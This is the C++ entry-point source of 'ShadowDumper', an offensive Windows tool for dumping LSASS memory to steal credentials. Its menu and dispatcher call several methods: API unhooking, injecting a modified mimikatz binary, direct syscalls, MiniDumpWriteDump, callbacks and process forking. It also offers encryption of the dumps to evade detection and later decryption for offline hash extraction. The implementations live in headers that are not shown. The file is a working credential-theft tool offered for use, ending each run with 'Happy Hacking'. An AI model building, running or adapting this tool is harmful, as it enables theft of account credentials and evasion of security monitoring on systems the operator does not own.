#define _CRT_SECURE_NO_WARNINGS // Suppress security warnings

#include <iostream>
#include <limits>
#define NOMINMAX
#include <windows.h>
#include <string>
#include <functional>
#include <vector>
#include "unhook.h"
#include "reflectdump.h"
#include "sysMDWD.h"


// Color constants
const int BLUE = 9;
const int GREEN = 10;
const int CYAN = 11;
const int RED = 12;
const int YELLOW = 14;
const int WHITE = 15;
const int MAGENTA = 13;
const int LIGHT_BLUE = 81;

// Set console text color
void SetConsoleColor(int color) {
    SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), color);
}

// Display the colorful copyright logo
void DisplayLogo() {
    SetConsoleColor(MAGENTA);
    std::cout << "*****************************************************************************" << std::endl;
    SetConsoleColor(CYAN);
    std::cout << "*       WELCOME TO MULTI-METHOD LSASS DUMPING TOOL (SHADOW DUMPER v2.0)         *" << std::endl;
    SetConsoleColor(YELLOW);
    std::cout << "*            Created by Usman Sikander (a.k.a offensive-panda)    *" << std::endl;
    SetConsoleColor(MAGENTA);
    std::cout << "****************************************************************************" << std::endl;
}

// Function to display the colorful main menu
void DisplayMenu() {
    SetConsoleColor(GREEN);
    std::cout << "\n*******************************" << std::endl;
    SetConsoleColor(CYAN);
    std::cout << "ShadowDumper: A powerful tool created in C/C++ to dump LSASS memory using multiple advanced techniques © Offensive-Panda" << std::endl;
    SetConsoleColor(YELLOW);
    std::cout << "Note: All Dump files will be stored in C:\\Users\\Public" << std::endl;
    SetConsoleColor(YELLOW);
    std::cout << "*******************************" << std::endl;
    SetConsoleColor(GREEN);
    std::cout << "\nSelect an option to proceed:" << std::endl;
    std::cout << "1. To dump lsass memory using unhooking technique to inject modified mimikatz binary [Token Elevation, SAM Dumping, Vault Credentials, Lsass Hashes Dumping]. " << std::endl;
    std::cout << "2. To dump lsass memory using unhooking technique to inject binary using direct syscalls with MDWD." << std::endl;
    std::cout << "3. To dump lsass memory using simple MiniDumpWriteDump API." << std::endl;
    std::cout << "4. To dump lsass memory using MINIDUMP_CALLBACK_INFORMATION callbacks and encrypt the dumps before writing on disk as per your choice. " << std::endl;
    std::cout << "5. To dump lsass memory using process forking technique and encrypt the dumps before writing on disk as per your choice." << std::endl;
    std::cout << "6. To dump lsass memory using direct syscalls with MiniDumpWriteDump." << std::endl;
    std::cout << "7. To dump lsass memory using direct syscalls (native dump with needed streams for parsing offline)." << std::endl;
    std::cout << "8. To decrypt the dump file before offline parsing with tools like (mimikatz or pypykatz)." << std::endl;
    std::cout << "0. Exit" << std::endl;
    SetConsoleColor(WHITE);
}

// Function to handle the execution based on user choice
void ExecuteTask(int option) {
    switch (option) {
    case 0:
        // Exit the program immediately when choice is 0
        SetConsoleColor(WHITE);
        std::cout << "Exiting the ShadowDumper...." << std::endl;
        exit(0); // Exit the program
    case 1:
        if (unhookPAN()) {
            SetConsoleColor(CYAN);
            std::cout << "Happy Hacking.....Enjoy Dump!" << std::endl;
            exit(0);
        }
        else {
            SetConsoleColor(RED);
            std::cout << "Failed to dump lsass....oops!" << std::endl;
            exit(0);
        }
        break;
    case 2:
        if (unhookOFF()) {
            SetConsoleColor(CYAN);
            std::cout << "Happy Hacking.....Enjoy Dump!" << std::endl;
            exit(0);
        }
        else {
            SetConsoleColor(RED);
            std::cout << "Failed to dump lsass....oops!" << std::endl;
            exit(0);
        }
        break;
    case 3:
        if (simpleMDWD()) {
            SetConsoleColor(CYAN);
            std::cout << "Happy Hacking.....Enjoy Dump!" << std::endl;
            exit(0);
        }
        else {
            SetConsoleColor(RED);
            std::cout << "Failed to dump lsass....oops!" << std::endl;
            exit(0);
        }
        break;
    case 4:
        std::cout << "Do you want to encrypt the dump before writing on disk [yes/no]: ";
        {
            std::string response;
            std::cin >> response;
            if (response == "yes" || response == "y" || response == "Y") {
                if (callbacksMDWD(true)) {
                    SetConsoleColor(CYAN);
                    std::cout << "Happy Hacking.....Enjoy Encrypted Dump!" << std::endl;
                    exit(0);
                }
                else {
                    SetConsoleColor(RED);
                    std::cout << "Failed to dump and encrypt data....oops!" << std::endl;
                    exit(0);
                }
            }
            else {
                if (callbacksMDWD()) {
                    SetConsoleColor(CYAN);
                    std::cout << "Lsass memory dumped successfully without encryption!" << std::endl;
                    exit(0);
                }
                else {
                    SetConsoleColor(RED);
                    std::cout << "Failed to dump data....oops!" << std::endl;
                    exit(0);
                }
            }
        }
        break;
    case 5:
        std::cout << "Do you want to encrypt the dump before writing on disk [yes/no]: ";
        {
            std::string response;
            std::cin >> response;
            if (response == "yes" || response == "y" || response == "Y") {
                if (reflectDump(true)) {
                    SetConsoleColor(CYAN);
                    std::cout << "Happy Hacking.....Enjoy Encrypted Dump!" << std::endl;
                    exit(0);
                }
                else {
                    SetConsoleColor(RED);
                    std::cout << "Failed to dump and encrypt data....oops!" << std::endl;
                    exit(0);
                }
            }
            else {
                if (reflectDump()) {
                    SetConsoleColor(CYAN);
                    std::cout << "Lsass memory dumped successfully without encryption!" << std::endl;
                    exit(0);
                }
                else {
                    SetConsoleColor(RED);
                    std::cout << "Failed to dump data....oops!" << std::endl;
                    exit(0);
                }
            }
        }
        break;
    case 6:
        if (sysMDWD()) {
            SetConsoleColor(CYAN);
            std::cout << "Happy Hacking.....Enjoy Dump!" << std::endl;
            exit(0);
        }
        else {
            SetConsoleColor(RED);
            std::cout << "Failed to dump lsass....oops!" << std::endl;
            exit(0);
        }
        break;
    case 7:
        if (syscallsNative()) {
            SetConsoleColor(CYAN);
            std::cout << "Happy Hacking.....Enjoy Dump!" << std::endl;
            exit(0);
        }
        else {
            SetConsoleColor(RED);
            std::cout << "Failed to dump lsass....oops!" << std::endl;
            exit(0);
        }
        break;
    case 8:
        SetConsoleColor(YELLOW);
        wchar_t inputFilePath[MAX_PATH];
        wchar_t outputFilePath[MAX_PATH];

        std::wcin.ignore(std::numeric_limits<std::streamsize>::max(), L'\n');
        // Prompt user for input file path
        std::wcout << L"Enter the input file path: ";
        std::wcin.getline(inputFilePath, MAX_PATH); // Read input directly

        // Prompt user for output file path
        std::wcout << L"Enter the output file path: ";
        std::wcin.getline(outputFilePath, MAX_PATH); // Read input directly

        if (DecryptDumpFile(inputFilePath, outputFilePath)) {
            SetConsoleColor(CYAN);
            std::wcout << L"Decryption completed successfully.......Enjoy Dump!" << std::endl;
            exit(0);
        }
        else {
            SetConsoleColor(RED);
            std::wcout << L"Failed to decrypt the file. Please try again." << std::endl;
            exit(0);
        }
        break;
    default:
        SetConsoleColor(RED);
        std::cout << "Invalid option! Please choose a valid option." << std::endl;
        exit(0);
    }
}

// Function to display a very colorful help message
void DisplayHelp() {
    SetConsoleColor(MAGENTA);
    std::cout << "\nUsage: ShadowDumper.exe [OPTION]" << std::endl;
    SetConsoleColor(CYAN);
    std::cout << "Options:" << std::endl;
    SetConsoleColor(YELLOW);
    std::cout << "  ShadowDumper.exe 1            To dump lsass memory using unhooking technique to inject modified mimikatz binary [Token Elevation, SAM Dumping, Vault Credentials, Lsass Hashes Dumping]." << std::endl;
    SetConsoleColor(RED);
    std::cout << "  ShadowDumper.exe 2            To dump lsass memory using unhooking technique to inject binary using direct syscalls with MDWD." << std::endl;
    SetConsoleColor(GREEN);
    std::cout << "  ShadowDumper.exe 3            To dump lsass memory using simple MiniDumpWriteDump API." << std::endl;
    SetConsoleColor(CYAN);
    std::cout << "  ShadowDumper.exe 4            To dump lsass memory using MINIDUMP_CALLBACK_INFORMATION callbacks and encrypt the dumps before writing on disk as per your choice." << std::endl;
    SetConsoleColor(YELLOW);
    std::cout << "  ShadowDumper.exe 5            To dump lsass memory using process forking technique and encrypt the dumps before writing on disk as per your choice." << std::endl;
    SetConsoleColor(RED);
    std::cout << "  ShadowDumper.exe 6            To dump lsass memory using direct syscalls with MiniDumpWriteDump." << std::endl;
    SetConsoleColor(GREEN);
    std::cout << "  ShadowDumper.exe 7            To dump lsass memory using direct syscalls (native dump with needed streams for parsing offline)." << std::endl;
    SetConsoleColor(CYAN);
    std::cout << "  ShadowDumper.exe 7            To decrypt the dump file before offline parsing with tools like (mimikatz or pypykatz)." << std::endl;
    SetConsoleColor(GREEN);


}

// Function to check and handle command-line arguments
void HandleCommandLineArguments(int argc, char* argv[]) {
    if (argc > 1) {
        std::string arg = argv[1];
        if (arg == "-h") {
            DisplayHelp();
        }
        else {
            try {
                int userChoice = std::stoi(arg);
                ExecuteTask(userChoice);
            }
            catch (const std::invalid_argument&) {
                SetConsoleColor(RED);
                std::cout << "Invalid argument provided. Please enter a valid option." << std::endl;
            }
        }
    }
}

BOOL IsElevated() {
    BOOL fRet = FALSE;
    HANDLE hToken = NULL;
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
        TOKEN_ELEVATION Elevation = { 0 };
        DWORD cbSize = sizeof(TOKEN_ELEVATION);
        if (GetTokenInformation(hToken, TokenElevation, &Elevation, sizeof(Elevation), &cbSize)) {
            fRet = Elevation.TokenIsElevated;
        }
    }
    if (hToken) {
        CloseHandle(hToken);
    }
    return fRet;
}

// Main function
int main(int argc, char* argv[]) {

    if (!IsElevated()) {
        wprintf(L"[!] You need elevated privileges to run this tool!\n");
        exit(1);
    }

    // Display the colorful logo
    DisplayLogo();

    // Handle command-line arguments
    HandleCommandLineArguments(argc, argv);

    int userChoice = -1;

    // If no command-line arguments, display the menu and handle user input
    if (argc == 1) {
        while (userChoice != 0) {
            DisplayMenu();
            std::cout << "Enter your choice to proceed: ";
            std::cin >> userChoice;
            ExecuteTask(userChoice);
            std::cout << std::endl;
        }
    }

    SetConsoleColor(WHITE);
    std::cout << "Goodbye!" << std::endl;

    return 0;

}